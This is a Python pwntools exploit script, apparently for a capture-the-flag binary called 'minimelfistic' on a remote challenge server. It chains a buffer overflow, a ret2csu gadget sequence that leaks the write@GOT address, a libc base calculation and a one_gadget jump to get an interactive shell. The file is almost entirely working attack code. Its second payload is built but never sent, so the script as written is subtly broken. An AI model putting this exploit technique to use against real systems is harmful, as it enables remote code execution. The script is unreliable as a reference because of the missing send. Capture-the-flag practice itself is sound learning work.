from pwn import *

# pwntools setup

elf = ELF('./minimelfistic')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# connect to challenge server
p = remote('178.128.35.132', 30477)
p.recvuntil('>')


# Addresses
WRITE_PLT = elf.plt['write']
WRITE_GOT = elf.got['write']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

# Log Outputs
log.info("WRITE PLT: " + hex(WRITE_PLT))
log.info("WRITE GOT: " + hex(WRITE_GOT))
log.info("POP RDI: " + hex(POP_RDI))
log.info("RET: " + hex(RET))

# Ret2Csu Addresses
pops = 0x400a3a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
movs = 0x400a20 # mov rdx, r15; mov rsi, r14; mov edi, r13; call QWORD PTR [r12 + rbx*8]

'''
    write(rdi=1, rsi=WRITE_GOT, rdx=4)

    rdi = r13
    rsi = r14
    rdx = r15
'''

# send exploit to overflow buffer and leak WRITE@GOT Address - restart program by calling 'main'
payload = b'9'
payload += b'A' * 71
payload += p64(pops) + p64(0) + p64(1) + p64(WRITE_GOT) + p64(1) + p64(WRITE_GOT) + p64(8) + p64(movs)
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(elf.symbols['main'])
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()

# read leaked adddress
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, 'little')
log.info("LEAKED WRITE: " + str(leak))

# one shot gadget, found using one_gadget - https://github.com/david942j/one_gadget
ONE_SHOT = 0x10a41c

# calcuate libc base from leak
libc.address = leak - libc.symbols['write']

# send exploit to overflow buffer and call our oneshot gadget
payload =b'9' + b'A'*71 + p64(libc.address + ONE_SHOT) + b'\x00' * 128

# interactive shell
p.interactive()



